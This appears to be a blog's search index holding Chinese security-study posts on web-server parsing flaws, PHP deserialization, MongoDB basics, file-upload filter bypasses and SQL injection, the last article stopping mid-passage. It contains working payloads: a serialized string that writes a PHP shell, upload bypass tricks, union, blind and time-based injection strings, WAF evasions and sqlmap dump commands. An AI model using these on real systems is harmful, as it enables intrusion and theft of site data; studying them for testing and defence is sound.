<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[文件上传解析漏洞小结]]></title>
    <url>%2F2019%2F01%2F20%2F%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[前言这里有一个集合了好多解析漏洞的地方：vulhub-github，但其实它是一个漏洞靶场 nginxnginx 1.6.21http://www.test.com/1.txt/hack.php 如果hack.php不存在，就会以.php后缀去执行1.txt，所以最后执行的其实是： 1http://www.test.com/1.php nginx 1.x + php 7.x该漏洞属于用户配置不当造成的解析漏洞 假设你上传了一个图片马，地址为 1http://www.test.com/1.png 那么漏洞地址就是： 1http://www.test.com/1.png/.php apacheapache 2.2.x我不太懂，这里有文档：Apache HTTPD 多后缀解析漏洞 如果运维人员给.php后缀增加了处理器： 1AddType application/x-httpd-php .php 上传1.php.haha的文件 1www.test.com/1.php.haha haha后缀不存在，Apache会左移寻找能解析的后缀，所以最后会解析1.php的内容 apache 2.4.0~2.4.29CVE-2017-15715 直接上传一个1.php文件，然后抓包在后缀名后添加\x0a，然后访问如下网址： 1www.test.com/1.php\x0a IISIIS 61www.test.com/1.asp.jpg 1www.test.com/1.asp/1.jpg IIS 7.512a.jpg是一个图片马，1.php不存在www.test.com/a.jpg/1.php 未完待续······]]></content>
      <tags>
        <tag>解析漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>%2F2019%2F01%2F17%2FPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[序列化与反序列化用户数据在$_SESSION中存储，当用户数据过大，内存占用过大，为了节省内存，选择把用户数据存储在文件中，即使用serialize()函数把用户数据存储到文件中，在使用的时候，在通过unserialize()函数调用 漏洞成因漏洞的形成的根本原因是程序没有对用户输入的反序列化字符串进行检测，导致反序列化过程可以被恶意控制，进而造成代码执行、getshell等一系列不可控的后果 serialize()函数用于序列化对象或数组，并返回一个字符串。 整数12：i:12; 字符串abc：s:3:&quot;abc&quot;; 浮点型3.14：d:3.14; 布尔型：true-&gt;b:1;、false-&gt;b:0; 数组array(&#39;abc&#39;,&#39;ab&#39;)：a:2:{i:0;s:3:&quot;abc&quot;;i:1;s:2:&quot;ab&quot;;} NULL：N; 对象： 1234567891011121314&lt;?phpclass obje&#123; var $name = &apos;clancy&apos;; var $age = &apos;18&apos;; function play()&#123; echo $this-&gt;age; echo &quot;\n&quot;; &#125;&#125;$p = new obje();$p-&gt;play();var_dump($p);echo serialize($p);?&gt; 1234567818object(obje)#1 (2) &#123; [&quot;name&quot;]=&gt; string(6) &quot;clancy&quot; [&quot;age&quot;]=&gt; string(2) &quot;18&quot;&#125;O:4:&quot;obje&quot;:2:&#123;s:4:&quot;name&quot;;s:6:&quot;clancy&quot;;s:3:&quot;age&quot;;s:2:&quot;18&quot;;&#125; unserialize()函数用于将通过serialize()函数序列化后的对象或数组进行反序列化，并返回原始的对象结构。 对象： 123456789&lt;?phpclass obje&#123; var $name = &apos;clancy&apos;; var $age = &apos;18&apos;;&#125;$p = new obje();$c = serialize($p);var_dump(unserialize($c));?&gt; 123456object(obje)#2 (2) &#123; [&quot;name&quot;]=&gt; string(6) &quot;clancy&quot; [&quot;age&quot;]=&gt; string(2) &quot;18&quot;&#125; 对象中的成员变量可控，成员函数如__wakeup()中调用了危险函数，然后在反序列化就会有漏洞 反序列化黑盒测试基本测不出来，需要代码审计 可利用函数1234567891011__wakeup() //使用unserialize时触发__sleep() //使用serialize时触发__destruct() //对象被销毁时触发__call() //在对象上下文中调用不可访问的方法时触发__callStatic() //在静态上下文中调用不可访问的方法时触发__get() //用于从不可访问的属性读取数据__set() //用于将数据写入不可访问的属性__isset() //在不可访问的属性上调用isset()或empty()触发__unset() //在不可访问的属性上使用unset()时触发__toString() //把类当作字符串使用时触发__invoke() //当脚本尝试将对象调用为函数时触发 一个简单的示例 如何getshell？ 只需构造一个序列化的字符串即可： 1O:3:&quot;reg&quot;:2:&#123;s:4:&quot;name&quot;;s:9:&quot;shell.php&quot;;s:3:&quot;age&quot;;s:18:&quot;&lt;?php phpinfo();?&gt;&quot;;&#125; 然后base64编码跟在message后 1http://localhost/?message=TzozOiJyZWciOjI6e3M6NDoibmFtZSI7czo5OiJzaGVsbC5waHAiO3M6MzoiYWdlIjtzOjE4OiI8P3BocCBwaHBpbmZvKCk7Pz4iO30= 成功写入： 访问shell.php： 成功getshell]]></content>
  </entry>
  <entry>
    <title><![CDATA[mongodb学习小记]]></title>
    <url>%2F2019%2F01%2F16%2Fmongodb%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[学习目标：会简单使用MongoDB即可 NoSQLNoSQL -&gt; not only sql，指的是非关系型数据库，是对不同于传统的关系型数据库的数据库管理系统。 Mongodb一个面向文档存储的数据库，即数据存在文件里 与传统数据库如mysql相对比： 1234database -&gt; databasetable -&gt; collectionrow -&gt; documentcolumn -&gt; field 启动MongoDB1[~]# mongo 创建数据库1use DATABASE_NAME 在mysql中，这条命令的意思是切换数据库 但在mongodb中，这条命令的意思是如果数据库不存在，则创建数据库，否则切换到指定数据库 创建数据库： 12&gt; use clancyswitched to db clancy 查看当前数据库： 12&gt; dbclancy 查看所有数据库： 1234&gt; show dbsadmin 0.000GBconfig 0.000GBlocal 0.000GB 如果新创建的数据库没数据，执行这条命令不会显示 mongodb默认数据库为test，如果没有创建新的数据库，集合将存放在test数据库中 删除数据库删除当前数据库 12&gt; db.dropDatabase()&#123; &quot;dropped&quot; : &quot;clancy&quot;, &quot;ok&quot; : 1 &#125; 如果数据库中没东西，删除可能会失败 创建集合12&gt; db.createCollection(&apos;blog&apos;)&#123; &quot;ok&quot; : 1 &#125; 查看集合1234567&gt; show collectionsblog或&gt; show tablesblog 删除集合语法： 1db.COLLECTION_NAME.drop() 例： 12&gt; db.blog.drop()true 插入文档语法： 1db.COLLECTION_NAME.insert(document) 例： 1db.blog.insert(&#123;&apos;name&apos;:&apos;yasuo&apos;&#125;) mongodb的数据以json的格式存储，看起来很简约： 123456789创建时可以多行创建，会有三个点提示你继续&gt; db.blog.insert(&#123;... &apos;name&apos;:&apos;blog&apos;,... &apos;time&apos;:&apos;today&apos;,... &apos;age&apos;:&apos;ten&apos;,... &apos;pages&apos;:2,... &apos;fork&apos;:&apos;github&apos;... &#125;)WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;) 以变量方式存储： 1234567&gt; document=(&#123;... title:&apos;learn mongodb&apos;,... &apos;by&apos;:&apos;runoob&apos;,... &apos;time&apos;:1,... tage:[&apos;mongodb&apos;,&apos;nosql&apos;,&apos;blog&apos;],... top:500... &#125;) 执行后结果： 1234567891011&#123; &quot;title&quot; : &quot;learn mongodb&quot;, &quot;by&quot; : &quot;runoob&quot;, &quot;time&quot; : 1, &quot;tage&quot; : [ &quot;mongodb&quot;, &quot;nosql&quot;, &quot;blog&quot; ], &quot;top&quot; : 500&#125; 查询文档查看一个文档： 1db.COLLECTION_NAME.findOne() #它只返回一个文档 查看所有文档： 1db.COLLECTION_NAME.find() 12&gt; db.blog.find()&#123; &quot;_id&quot; : ObjectId(&quot;5c3f1cb261ebcf0a09bd2fb3&quot;), &quot;name&quot; : &quot;blog&quot;, &quot;time&quot; : &quot;today&quot;, &quot;age&quot; : &quot;ten&quot;, &quot;pages&quot; : 2, &quot;fork&quot; : &quot;github&quot; &#125; 优雅的查看所有文档： 1db.COLLECTION_NAME.find().pretty() 123456789&gt; db.blog.find().pretty()&#123; &quot;_id&quot; : ObjectId(&quot;5c3f1cb261ebcf0a09bd2fb3&quot;), &quot;name&quot; : &quot;blog&quot;, &quot;time&quot; : &quot;today&quot;, &quot;age&quot; : &quot;ten&quot;, &quot;pages&quot; : 2, &quot;fork&quot; : &quot;github&quot;&#125; mongodb数据库中的比较运算12345678小于：$lt 和html中的右尖括号`&lt;`差不多（&amp;lt;）小于或等于：$lte大于：$gt 和html中的左尖括号`&gt;`差不多（&amp;gt;）大于或等于：$gte不等于：$ne还有一些如：正则匹配：$regex mongodb AND条件MongoDB 的 find() 方法可以传入多个键(key)，每个键(key)以逗号隔开，即常规 SQL 的 AND 条件。 语法格式如下： 12&gt; db.blog.find(&#123;key1:value1&#125;,&#123;key2:value2&#125;)基本上在mongodb中，每一组键值都需要用大括号括起来 上面的语句类似于mysql中的：where name=&#39;zs&#39; and age=10 mongodb OR条件1234567&gt;db.col.find( &#123; $or: [ &#123;key1: value1&#125;, &#123;key2:value2&#125; ] &#125;).pretty() AND 和 OR 联合使用以下语句类似于mysql中的：where age&gt;10 and name=&#39;zs&#39; or title=&#39;blog&#39; 1db.blog.find(&#123;&apos;age&apos;:&#123;$gt:10&#125;,$or:[&#123;&apos;name&apos;:&apos;zs&apos;&#125;,&#123;&apos;title&apos;:&apos;blog&apos;&#125;]&#125;).pretty() 写起来挺有意思的，多练练就会了 更新文档 摘自runoob 语法： 123456789db.collection.update( &lt;query&gt;, &lt;update&gt;, &#123; upsert: &lt;boolean&gt;, multi: &lt;boolean&gt;, writeConcern: &lt;document&gt; &#125;) 参数说明： query : update的查询条件，类似sql update查询内where后面的。 update : update的对象和一些更新的操作符（如$,$inc…）等，也可以理解为sql update查询内set后面的 upsert : 可选，这个参数的意思是，如果不存在update的记录，是否插入objNew,true为插入，默认是false，不插入。 multi : 可选，mongodb 默认是false,只更新找到的第一条记录，如果这个参数为true,就把按条件查出来多条记录全部更新。 writeConcern :可选，抛出异常的级别。 尝试： 12&gt; db.blog.update(&#123;&apos;name&apos;:&apos;blog&apos;&#125;,&#123;$set:&#123;&apos;name&apos;:&apos;MyBlog&apos;&#125;&#125;)WriteResult(&#123; &quot;nMatched&quot; : 1, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 1 &#125;) 123456789&gt; db.blog.find().pretty()&#123; &quot;_id&quot; : ObjectId(&quot;5c3f1cb261ebcf0a09bd2fb3&quot;), &quot;name&quot; : &quot;MyBlog&quot;, &quot;time&quot; : &quot;today&quot;, &quot;age&quot; : &quot;ten&quot;, &quot;pages&quot; : 2, &quot;fork&quot; : &quot;github&quot;&#125; 尝试更新一条不存在的数据，发现它新建了一个文档： 1234567&gt; db.blog.update(&#123;&apos;new&apos;:&apos;test&apos;&#125;,&#123;$set:&#123;&apos;new&apos;:&apos;hello&apos;&#125;&#125;,&#123;upsert:true&#125;)WriteResult(&#123; &quot;nMatched&quot; : 0, &quot;nUpserted&quot; : 1, &quot;nModified&quot; : 0, &quot;_id&quot; : ObjectId(&quot;5c3f20e57942b94da685f5c1&quot;)&#125;) 删除文档语法： 1234567db.collection.remove( &lt;query&gt;, &#123; justOne: &lt;boolean&gt;, writeConcern: &lt;document&gt; &#125;) 参数说明： query :（可选）删除的文档的条件。 justOne : （可选）如果设为 true 或 1，则只删除一个文档，如果不设置该参数，或使用默认值 false，则删除所有匹配条件的文档。 writeConcern :（可选）抛出异常的级别。 例： 12&gt; db.blog.remove(&#123;&apos;new&apos;:&apos;hello&apos;&#125;)WriteResult(&#123; &quot;nRemoved&quot; : 1 &#125;) 删除所有数据： 123456&gt; db.blog.remove(&#123;&#125;)WriteResult(&#123; &quot;nRemoved&quot; : 2 &#125;)再次查看，一无所有：&gt; db.blog.find()&gt; 未完待续······]]></content>
      <tags>
        <tag>mongodb</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件上传漏洞绕过]]></title>
    <url>%2F2019%2F01%2F12%2F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%A6%82%E8%A6%81%2F</url>
    <content type="text"><![CDATA[前言：本文参考自casperkid大佬的Upload Attack Framework 客户端检测绕过打开F12开发者工具，查看网络，或者抓包，如果上传木马时无流量传输变提示禁止上传，则可以判断为客户端检测 绕过： 123burp抓包浏览器禁用jsF12-&gt;开发者工具，删除检测函数 服务端检测绕过0x01 MIME绕过：假设只允许上传gif图，则修改Content-Type类型为 1Content-Type:image/gif 有时有些网站会要求上传的文件类型时其他的类型，MIME类型不知道的话，完全可以在本地写一个上传页面，然后把接收到的文件的类型var_dump()出来就可以了 0x02 目录路径绕过目录路径一般是用0x00截断，但也有两种不同情况。 第一种路径在post数据包的请求行： 1&amp;path=uploads/hack.php%00.gif 因为实在url中，所以在传给服务器之前会进行解码，所以需要对0x00编码 第二种路径在post数据包的请求内容中： 1uploads/hack.php .gif .gif前的一个空格是0x00，在burp中抓包后在HEX中修改 其他fckeditor php &lt;= 2.6.4 任意文件上传漏洞 0x03 文件扩展名结合目录路径：filename=’hack.php/evil.jpg’ 黑名单检测 文件名大小写绕过 如pHP、aSp、JSp之类的文件名绕过 双写绕过 有的程序判断如果存在危险后缀会把后缀替换为空，这个时候就可使用双写绕过，如：aaspsp、pphphp、jjspsp 猜测未被过滤的文件名绕过 毕竟黑名单，不可能写全，把一些不常见的试一试，这里列一些 12html,htm,php,php2,php3,php4,php5,phtml,pwml,inc,asp,aspx,ascx,asa,jsp,cfm,asis,sh,shtml,shtm,phtm,htaccess,cfc,pl,bat,exe,com,dll,vbs,js,reg,cgi但是要根据目标系统来选择，有的即使上传上去了也执行不了，白搭 当未过滤htaccess文件时，可以上传一个自定义htaccess文件，配合一个正常文件进行攻击： 1234文件内容如下：&lt;FilesMatch &quot;hack&quot;&gt; SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 上传正常文件时不需要扩展名，只需要名字里包含hack即可 特殊文件名绕过 抓包后修改后缀名如下： 123456注：下划线为空格hack.php.hack.php_hack.php._hack.php._.hack.php_._ 注：仅适用于windows系统 0x00截断绕过 1hack.php .gif 解析漏洞绕过 白名单检测 0x00截断 解析漏洞绕过 其他fckeditor 2.4.3 黑名单检测 0x04 文件内容检测文件幻数检测即文件头检测，要想绕过就需要在文件内容的开头加入以下值 123456789jpgValue = ff d8 ff e0 00 10 4a 46 49 46gifValue = 47 49 46 38 39 61即`GIF89a`pngValue = 89 50 4e 47 可以通过burp抓包然后在HEX中进行修改 文件相关信息检测通常代码层会使用getimagesize()函数进行检测 绕过方式就是做一个图片马： 1copy a.png /b + hack.php = test.png 或者使用工具如edjpgcom图片插入一句话工具等进行图片马制作，看了casperkid大佬的文件上传framework中说的代码注入绕过，这个工具就是这么做的 上传测试流程在测试一个上传点时，如何不放过任何一种情况，这个时候就需要我们有一个思路，按照这个思路一步一步来测试，就会很明白 第一：上传一张正常的图片，检查上传点是否正常，如果正常，则继续 第二：打开burp等抓包工具，上传一句话木马文件，如果被拦截，首先修改文件的MIME类型，如果不被拦截，则可判断此处为MIME类型检测 第三：如果还是被拦截，则继续修改文件后缀名为允许上传的后缀名，如果不被拦截，则可判断此处为后缀名检测 第四：如果被拦截，则检测方式为文件幻数或文件内容检测，使用edjpg等工具制作图片马即可 注：上传是为了木马可被解析，有些时候即使图片马可以上传，但解析不了也没有用 如果本文有任何错误，欢迎留言给我：Contact Me！]]></content>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入]]></title>
    <url>%2F2019%2F01%2F06%2FSQL%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[本文只是笔记整理，可能有不足之处，望大佬之处 什么是SQL注入所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令 SQL注入原理：对用户输入过滤不严谨 SQL注入本质：违背了数据与代码分离的原则 SQL注入漏洞有两个关键条件 用户能控制输入的内容 web应用把用户输入的内容带入到数据库去执行 只要满足以上两个条件，都有可能存在注入漏洞，所以，有注入的漏洞不仅仅是id=1这种 不仅仅只是select语句有注入漏洞，也要学会对update,delete,insert语句进行注入攻击 万能密码过滤不严谨，用or构造语句恒为true，从而绕过登录 万能密码一般在用户名的输入处进行尝试，因为密码会被加密，所以无法绕过 万能密码还有一种是使用union联合查询进行绕过，至于为什么这么做，可以看下面源代码 SQL注入常见流程 判断是否有注入 获取数据库信息 获取数据库基本信息如user()、database()、version()、@@basedir、@@datadir、@@tmpdir 获取数据库名 获取表名 获取列名 获取用户数据 破解数据 找后台 脱裤 跑路 去喝茶 找到注入点能跑出个版本号就可以了，再往下就过分了 SQL注入常用函数12345678910111213group_concat()count()length()ascii()/ord()substr()/mid()if()sleep()/benchmark() 报错注入12345678910111213141516171819floor()extractvalue()updatexml()geometrycollection()multipoint()polygon()multipolygon()linestring()multilinestring()exp() SQL注入分类0x00 SQL注入之注入点类型判断请查看 –&gt; SQL注入之注入点类型判断 以下记录均假定注入类型为单引号注入&#39; 根据SQL注入的反馈类型大致可分为显注和盲注 基于错误显示的SQL注入即报错注入，用一些特殊的报错函数去构造语句，从而达到爆数据的目的 详情：十种MySQL报错注入 union类型的联合查询注入在mysql中，有information_schema这个数据库，union注入依赖这个数据库进行，在这个数据库中，存放的是所有数据库的信息，并且是公开的，任何用户都可以访问 这是一张数据表： union注入的一般步骤如下所示： order by 原意是根据字段进行排序，在注入中，可通过它来猜总共有几个字段 12&apos; order by 6 # -&gt; 正常&apos; order by 7 # -&gt; 报错 注意：在数据库中，使用的是#，但是在url中必须把#编码成%23 在mysql交互环境中，必须以;结尾，但实际注入中并不需要 可以看到当输入的字段数大于实际值时，会报错，这里可确定有六个字段 union select order by猜出字段数后，我们需要用联合查询显示出我们想要的东西，先来看看union select的用法： 可以看到输入的1,2,3,4,5,6都显示出来了，说明这是可控的，再来看： 通过输入version()等函数，可直接爆出版本等信息，上面的几种函数都可以使用，但是有一个问题，开发人员在写PHP连接mysql时，使用mysql_fetch_assoc()等类似函数，这种函数会从结果集中取出一行作为结果返回，所以虽然在数据库中能看到这个数据，但是在注入时是看不到的，这个时候就需要把前面的查询语句报错，后面的语句才能被显示，如下所示： 构造语句使前面报错： 1id =-1&apos; union select 1,2,3,4,5,6 %23 向下面这样，不报错 这样就报错了，可以看到2,3,4这三个字段被回显出来，之后就可以更改这三个字段为mysql函数进行注入 之后就简单了，在这里罗列下注入语句 1234567891011查看所有库名id =-1&apos; union select 1,2,group_concat(schema_name),4,5,6 from information_schema.schemata %23查看msg数据库所有表名id =-1&apos; union select 1,2,group_concat(table_name),4,5,6 from information_schema.tables where table_schema=0x6d7367 %23查看msg数据库user表的所有字段id =-1&apos; union select 1,2,group_concat(column_name),4,5,6 from information_schema.columns where table_schema=0x6d7367 and table_name=0x75736572 %23查看msg数据库user表的user和pass字段id=-1&apos; union select 1,group_concat(username),group_concat(password),4,5,6 from users%23 到这儿就结束了，待会儿有人请你喝茶，稍等片刻 布尔类型的SQL注入页面有变化，但是不给出具体报错信息，即为bool盲注 在测注入点类型时，即可看出是否为bool盲注: 加单引号 bool盲注也简单 一般步骤是这样的，比如说要看版本号 先测长度： 1id=1&apos; and length(version())&gt;10 %23 如果版本号大于10，则回显与id=1的回显相同，如果版本号不大于10，则回显与id=1不同，依据这个，使用二分法一点一点猜就可以了 二分法123432 79 126 55 102 43 67 90 114 37 49 61 73 84 96 108 120 再测每个字符： 1id=1&apos; and ascii(substr(version(),1,1))&gt;100 %23 这段代码的意思是判断版本号的第一个字符的ascii值是否大于100 比如查第3个数据库的库长： 1id=1&apos; and (select length(schema_name) from information_schema.schemata limit 2,1)&gt;10 %23 查第3个数据库名的第5个字符： 1id=1&apos; and (select ascii(substr(schema_name,5,1)) from information_schema.schemata limit 2,1)&gt;100 %23 布尔注入比较麻烦，在实际过程中，如果检测到有bool盲注，可以自己写脚本或者使用SQLMAP跑就可以了，可惜我XX目前还不会python，用php写了两天写出来个脚本用来bool盲注，哎，赶紧学python吧，别整那没用的 延时注入所谓延时注入，就是根据服务器响应时间来判断是否存在注入 当测注入点时发现不管怎么测页面都没反应，那就可以在测试语句中加入sleep(n)函数测试，比如sqli-labs第9关 测版本长度： 1id=1&apos; and if(length(version())&gt;10,sleep(5),0) %23 如果版本长度大于10页面就会转啊转，转5s以上 注入语句 测版本第一个字符： 1id=1&apos; and if(ascii(mid(version(),1,1))&gt;100,sleep(5),0)%23 测第3个数据库长度： 1id=1&apos; and if((select length(schema_name) from information_schema.schemata limit 0,1)&gt;5,sleep(5),0)%23 测第5个数据库的第12个字符： 1id=1&apos; and if((select ascii(substr(schema_name,12,1)) from information_schema.schemata)&gt;79,sleep(5),0) 基本步骤就这样，多练，就会了，这里有两个点需要注意： 在select语句中，请使用and不要使用or，使用or前提是把前面参数弄一个不存在的，其次mysql后匹配所有的结果然后进行sleep(5)，所以时间会很长，亲身示范给你们： 在if语句中，第三个参数是可以随便写的，但是建议写0，因为0可以代表bool假，如果条件判断不正确，就会返回第三个参数，即0，可以避免很多情况，尤其是在后面的增删改语句中尤为明显 根据SQL语句的类型select略 insert123insert into messages (title,message,......) values (&apos;hello&apos;,&apos;123&apos;,......);insert into messages (title,message,time,content,author) values (&apos;hello&apos;,&apos;123&apos;,&apos;2018&apos;,&apos;123&apos;,&apos;admin&apos; ); 对insert语句注入非常简单，只需根据语句特点进行构造出一个正常的语句即可 比如上面的语句,对message字段进行注入攻击，可以这样构造： 12insert into messages (title,message,time,content,author) values(&apos;hello&apos;，&apos;msg&apos;,1,1,1)#&apos;) 在上述语句中，你的payload是长这样的： 1msg&apos;,1,1,1)# 在实际环境中，我们并不知道有多少个字段，所以就需要一个一个的尝试，有时我们注入的字段并不显示在页面中，这时就可以同时注入两条语句进行攻击，攻击代码如下所示： 1msg&apos;,1,1,1),(version(),1,1,1,1)# 在后续注入中，只需把1转换为要注入的语句即可 updateupdate语句一般都是延时注入，不过其他注入也有可能出现，延时注入可以保证语句不被执行 有个特别需要注意的地方： ​ 不要使用&#39; #或&quot; #来执行SQL语句，因为这样会造成所有记录全被执行更新操作，想象一下如果是修改密码时有这个注入，直接全站所有密码被改 ​ 还有就是update语句一般是在where字句之前，所以构造的注入语句中需要带上where子句 update语句长这样： 1update users set pass = &apos;123456&apos; where name = &apos;user&apos;; 这样测试： 121. 123&apos;2. 123&apos; where sleep(2) # sleep()函数返回结果为0，所以条件永假，不会执行update操作 但是这样有一个弊端，当where返回false后，mysql回去检索每一个语句，从而执行时间就是记录数*sleep时间 所以语句可以这样改进一下： 1123&apos; where id = 100 and sleep(2)# 增加一个限制条件 但是又有一个问题，就是前提条件是此网站有id这个字段，并且你能猜到值，如果实在猜不到，那就使用上面的语句直接sleep吧，记得把sleep时间改小点。benchmark函数好像不会和前面的列数相乘，但是会消耗网站所在服务器资源，不太好，也很危险，慎用 如果存在注入，那就把sleep()替换成注入语句执行就可以了 注入语句长这样： 1123&apos; where id=7100 and if(length(version())&gt;5,sleep(3),0)# delete这个语句和update一样，都是高危语句，在进行注入的时候，一定要在本地测试好语句，没问题了再进行注入 delete语句同样也需要注意几个点 不要使用&#39; #或&quot; #来执行SQL语句 if语句的返回结果一定要为0，也就是说if的第2,3个参数的结果一定要为0，如果不为0导致语句被执行，误删了机密文件，那你倒是能获得一杯普洱茶 1delete from users where id = &apos;57&apos; and title = &apos;qwerdf&apos;; 这两个点都有可能是让用户操作的点，假设让我们输入title，那么测试顺序： 12345qwer&apos;请一定要跳过:`qwer&apos;#`这一步，把where条件注释掉，你是要删库跑路吗？？？qwer&apos; and sleep(3)# 如果不想真的删除一条数据，就可以使用时间延时盲注，注意if语句返回结果一定要都是0 1qwer&apos; and if(length(version())&gt;5,sleep(3),0) # 如果数据足够多，就用布尔盲注，这样比较快 1qwer&apos; and length(version())&gt;5 # 根据业务类型点进行分类登录登录处的处理方式目前我知道的有两种： select直接查询用户名和密码 1select * from users where user=&apos;tom&apos; and pass=&apos;hello&apos;; 但是有一个问题，如果用户名不存在，语句直接为假，就不执行后面的语句了，所以在进行测试之前，可以先注册一个，然后拿注册的用户去测试就不用考虑这个问题了 select只查询用户名，然后拿用户输入的密码和数据库中该用户的密码作比对 两种逻辑在注入时没区别，只不过第二种万能密码绕不过去 测试流程 1231.判断注入点是什么类型的2.tom&apos; and sleep(3)#3.tom&apos; and if(length(version())&gt;5,sleep(3),0) 注意事项 1231.登录一般在成功后都会跳转，所以最好的注入方式就是延时注入2.密码基本上都是经过加密的，所以能注入的地方也就只有用户名的地方3.注入语句不要转码！ 注册注册功能通过select+insert语句完成操作 先查询输入的用户名是否存在，如果不存在则创建此用户 对insert进行注入，先注册一个jack： 123jack&apos;,sleep(5))#jack&apos;,if(length(version())&gt;5,sleep(3),0)# 对select进行注入： 1234admin&apos; and sleep(5)#注意事项and sleep()时保证and前面为真 留言留言界面一般会使用insert语句完成数据库操作，所以只需要绕过insert语句就可以了 123msg&apos;,1,1,1)#msg&apos;,user(),1,1)# 能显注就显注，如果显注没用再尝试盲注 删除留言delete 涉及到update和delete的功能都是高危功能，测试时请务必小心 删除留言肯定需要delete语句，在测试过程中，结合网站特征构造delete即可，最好使用延时注入，因为这样不会真的删除数据，在操作前，请先在本地数据库试验是否可以执行 搜索select …. like ‘%%’ 搜索基本上都是像上面这样的，知道原理，搞就完事儿 重置密码、更新个人资料update 在这些地方可以尝试构造update语句来完成注入 注意如果没有限制条件，延时注入的时间会非常的长 根据数据库类型不同的分类mysql数据库注入access数据库注入mssql数据库注入Oracle数据库注入其他宽字节注入前提：数据库编码格式为’gbk’/‘gb2312’等 这种漏洞多存在与Windows系统中 注入方式： 1在注入点类型如单引号`&apos;`前加入%80到%df中的任意一个 一般宽字节注入只能通过工具注入，因为直接输入%会被编码 utf8 没有宽字节注入 ，因为没有5c结尾的编码 %5c -&gt; \ 二次解码注入漏洞成因：addslashes()函数在urlencode函数之前使用 黑盒测试一般测不出来 SQL注入之waf绕过什么是wafweb应用防护系统，也称网站应用级入侵防御系统。英文叫做Web Application Firewall,简称叫waf。主要是对web特有的入侵方式加强防护，如DDOS防护，SQL注入、XML注入、XSS等 waf也有很多的种类：代码waf、软件waf、硬件waf、云waf等等 了解了什么是waf，那应该怎么绕过呢？ SQL注入绕waf常用方式1、大小写混合 uNIoN sELecT 1,2,3,4 2、替换关键字 selselsectect 1,2,3,4 3、使用编码 %55nion%53elect 1,2,3,4 4、使用注释 union /**/select 1,2,3,4 5、等价函数与命令 @@datadir ==&gt; datadir() 6、特殊符号 select+id+from users 工具的使用SQLMAP以下命令是在windows环境中使用sqlmap，在kali中的使用和windows中差不多 首先要去Github中下载一个sqlmap，解压出来后在sqlmap的文件夹下打开cmd窗口 对了，还要有Python环境哦，还要是Python2的环境 打开sqlmap：python sqlmap.py 扫描网站：python sqlmap.py –url http://192.168.11.76/index.php?id=1 -v参数，7个等级0-6 0、只显示Python错误以及严重的信息 1、同时显示基本信息和警告信息 2、同时显示debug信息 3、同时显示注入的payload 4、同时显示HTTP请求 5、同时显示HTTP响应头 6、同时显示HTTP响应页面 常规步骤 判断是否有注入 sqlmap -u http://192.168.11.86/index.php?id=1 查看数据库 sqlmap -u http://192.168.11.86/index.php?id=1 –dbs 查看当前使用的数据库 sqlmap -u http://192.168.11.86/index.php?id=1 –current-db 查看数据表 sqlmap -u http://192.168.11.86/index.php?id=1 -D 数据库名 –tables 查看列名 sqlmap -u http://192.168.11.86/index.php?id=1 -D 数据库名 -T 表名 –columns 查看数据 sqlmap -u http://192.168.11.86/index.php?id=1 -D 数据库名 -T 表名 –dump 防御SQL注入addslashes():对整型数据无效 cookie处不要有SQL语句中的参数，不然会造成cookie注入 如果本文有任何错误，欢迎留言给我：Contact Me！]]></content>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入之注入点类型判断]]></title>
    <url>%2F2018%2F12%2F30%2FSQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%B3%A8%E5%85%A5%E7%82%B9%E7%B1%BB%E5%9E%8B%E5%88%A4%E6%96%AD%2F</url>
    <content type="text"><![CDATA[引言博主在发这篇文章之前的很长一段时间内，都搞不懂到底如何判断注入点类型，从而导致后续注入不知如何开始，一般都是瞎猫碰上死耗子用单引号&#39;和&quot;号之类的各种乱试 后来某大牛看我骨骼惊奇，就送了我一本《web玄学修炼之SQL注入》，额。。。。。里面就一张图，如下所示： 大图请前往我的github下载：点这里 开始 环境：MySQL 在判断注入点类型之前，需要对所有可能出现的类型进行总结，在下图中，我总结了九种类型的SQL语句： 我把它们这样命名，从上到下分别为： 1234567891011121314151617纯数字型数字+括号数字+双括号单引号单引号+括号单引号+双括号双引号双引号+括号双引号+双括号 注：在下面的过程中，请参考《web玄学修炼之SQL注入》中的图片 第一种：单引号添加单引号&#39;： 可以看到前六种情况报错了，也就是说在添加单引号&#39;后，数字型和单引号型的所有情况都出错了，只有双引号的三种情况正常 注：出错的含义是页面发生变化，不是仅指出现了报错语句 在这里，我们把这两种情况分开来进行 如果你在测试过程中，添加单引号页面无变化，请跳过单引号的解释，通过侧边栏的索引（三道杠），直接去看双引号的讲解 假设你的测试页面在输入单引号后报错，那么请继续向下看： 针对前六种情况，在单引号后加入#，由于url特性，在这里对#使用url编码：%23，执行后页面如图所示： 可以看到只有第4种情况恢复了正常，由此可以得出结论： 单引号注入点的payload为：&#39;%23 继续测试其他5种情况，在单引号&#39;和%23之间加入一个右括号)进行测试： 这次第五种情况恢复了正常，由此可以判断： 单引号+括号注入点的payload为：&#39;)%23 继续对1,2,3,6这四种情况进行测试，在右括号)和%23之间再加入一个右括号)： 此时第六种情况恢复了正常，由此可以判断： 单引号+双括号注入点的payload为：&#39;))%23 到这里，单引号的所有情况全部被分析了出来，但是如果这个时候你测试的页面仍旧报错怎么办，莫慌，在图中，依旧报错的前三种情况，他们都属于数字型的分支 第二种：数字型所以，接下来，我们对这三种情况进行测试，首先，删除&#39;))%23&#39;，在注入点最后加入and 1进行测试： 说明：用”and”来连接前后的语句，只有当”and”两边都为真时才为真 